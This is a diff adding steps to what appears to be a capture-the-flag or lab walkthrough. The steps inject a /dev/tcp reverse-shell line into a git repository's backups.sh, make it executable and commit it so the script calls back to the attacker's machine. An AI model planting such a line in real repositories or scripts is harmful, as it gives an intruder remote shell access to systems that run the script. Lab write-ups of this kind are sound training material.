@@ -122,6 +122,17 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated into git-server and typed [git config --global user.name "kali"] and [git config --global user.email "kali@kali.(none)"] to setup git identity:
 
+![](Pasted%20image%2020221017203812.png)
+
+#### -Typed "echo "sh -i >& /dev/tcp/[kali IP]/8080 0>&1" >> backups.sh " to inject a reverse shell into the "backups.sh" file and typed "chmod +x to make it executable:
+
+#### -Then typed "git add -A " and [git commit -m "pwn"] to commit the changes to the git-server:
+
+![](Pasted%20image%2020221017204016.png)
+![](Pasted%20image%2020221017204123.png)
+
+
+
 ## Privilege Escalation vector
 
 
